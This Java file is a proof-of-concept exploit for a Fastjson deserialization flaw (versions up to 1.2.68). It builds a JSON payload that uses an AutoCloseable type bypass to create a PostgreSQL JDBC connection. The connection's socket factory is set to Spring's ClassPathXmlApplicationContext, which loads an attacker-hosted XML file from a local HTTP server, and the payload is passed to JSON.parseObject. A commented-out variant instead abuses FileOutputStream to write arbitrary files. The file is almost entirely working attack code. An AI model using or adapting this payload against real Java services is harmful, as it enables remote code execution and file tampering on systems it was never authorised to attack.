package test;
import com.alibaba.fastjson.JSON;

public class Fastjson16_pgsql {
    public static void main(String[] args) throws Exception {
    	
        //<=1.2.68,依赖postgresql-42.3.1和spring环境,参考Pgsql的jdbc危害。
    	//h2 jar包居然没用-g编译，因此不用考虑h2的jdbc了
        String payload = "{\r\n"
        		+ "	\"@type\": \"java.lang.AutoCloseable\",\r\n"
        		+ "	\"@type\": \"org.postgresql.jdbc.PgConnection\",\r\n"
        		+ "	\"hostSpecs\": [{\r\n"
        		+ "		\"host\": \"127.0.0.1\",\r\n"
        		+ "		\"port\": 2333\r\n"
        		+ "	}],\r\n"
        		+ "	\"user\": \"test\",\r\n"
        		+ "	\"database\": \"test\",\r\n"
        		+ "	\"info\": {\r\n"
        		+ "		\"socketFactory\": \"org.springframework.context.support.ClassPathXmlApplicationContext\",\r\n"
        		+ "		\"socketFactoryArg\": \"http://127.0.0.1:81/test.xml\"\r\n"
        		+ "	},\r\n"
        		+ "	\"url\": \"\"\r\n"
        		+ "}";
//        payload = "{\r\n"
//        		+ "	\"@type\": \"java.lang.AutoCloseable\",\r\n"
//        		+ "	\"@type\": \"org.postgresql.jdbc.PgConnection\",\r\n"
//        		+ "	\"hostSpecs\": [{\r\n"
//        		+ "		\"host\": \"127.0.0.1\",\r\n"
//        		+ "		\"port\": 2333\r\n"
//        		+ "	}],\r\n"
//        		+ "	\"user\": \"test\",\r\n"
//        		+ "	\"database\": \"test\",\r\n"
//        		+ "	\"info\": {\r\n"
//        		+ "		\"socketFactory\": \"java.io.FileOutputStream\",\r\n"
//        		+ "		\"socketFactoryArg\": \"1.txt\"\r\n"
//        		+ "	},\r\n"
//        		+ "	\"url\": \"\"\r\n"
//        		+ "}";
        
        
        System.out.println(payload);
        JSON.parseObject(payload);	
    }
}
